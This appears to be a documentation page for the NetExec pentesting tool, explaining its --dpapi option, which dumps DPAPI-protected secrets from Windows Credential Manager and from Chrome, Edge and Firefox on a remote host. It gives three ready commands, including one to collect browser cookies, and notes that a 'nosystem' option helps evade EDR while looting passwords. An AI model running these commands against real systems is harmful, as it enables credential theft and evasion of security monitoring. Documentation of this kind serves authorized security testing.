---
description: Dump DPAPI credentials using NetExec
---

# 🆕 Dump DPAPI

You can dump DPAPI credentials using NetExec using the following option --dpapi. It will get all secrets from Credential Manager, Chrome, Edge, Firefox. --dpapi support options :&#x20;

* cookies : Collect every cookies in browsers
* nosystem : Won't collect system credentials. This will prevent EDR from stopping you from looting passwords :fire:

{% hint style="danger" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

```
$ nxc smb <ip> -u user -p password --dpapi
$ nxc smb <ip> -u user -p password --dpapi cookies
$ nxc smb <ip> -u user -p password --dpapi nosystem
```
